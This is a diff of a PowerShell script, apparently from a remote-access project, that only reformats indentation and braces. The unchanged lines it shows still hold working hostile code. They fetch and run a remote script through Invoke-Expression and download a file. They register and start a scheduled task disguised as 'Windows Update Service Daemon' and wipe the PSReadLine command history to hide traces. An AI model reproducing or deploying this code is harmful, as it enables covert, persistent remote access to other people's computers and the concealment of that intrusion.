@@ -6,13 +6,14 @@ $pingdaemontask = "Windows Update Service Daemon"
 $urlfortc = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/TaskSchedulerServiceCreater.ps1"
 Invoke-Expression (Invoke-WebRequest -Uri $urlfortc -UseBasicParsing).Content
 if (-not (Test-Path (Split-Path $localFilePath))) {
-    New-Item -Path (Split-Path $localFilePath) -ItemType Directory -Force | Out-Null
+  New-Item -Path (Split-Path $localFilePath) -ItemType Directory -Force | Out-Null
 }
 if (Test-Path -Path $localFilePath -PathType Leaf) {
-    Remove-Item -Path $localFilePath -Force
+  Remove-Item -Path $localFilePath -Force
 } try {
-    Invoke-WebRequest -Uri $url -OutFile $localFilePath -UseBasicParsing
-} catch {}
+  Invoke-WebRequest -Uri $url -OutFile $localFilePath -UseBasicParsing
+}
+catch {}
 #Create Windows Scheduled task
 $pingdaemonxml = @"
 <?xml version="1.0" encoding="UTF-16"?>
@@ -67,14 +68,15 @@ $pingdaemonxml = @"
 </Task>
 "@
 if (Get-ScheduledTask -TaskName $pingdaemontask -ErrorAction SilentlyContinue) {
-Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false
-} else {}
+  Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false
+}
+else {}
 Register-ScheduledTask -Xml $pingdaemonxml -TaskName $pingdaemontask | Out-Null
 Start-ScheduledTask -TaskName $pingdaemontask
 #CleanUP
 if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
-    $files = Get-ChildItem -Path $psreadlineFolderPath
-    if ($files.Count -gt 0) {
-        Remove-Item -Path "$psreadlineFolderPath\*" -Force
-    }
+  $files = Get-ChildItem -Path $psreadlineFolderPath
+  if ($files.Count -gt 0) {
+    Remove-Item -Path "$psreadlineFolderPath\*" -Force
+  }
 }
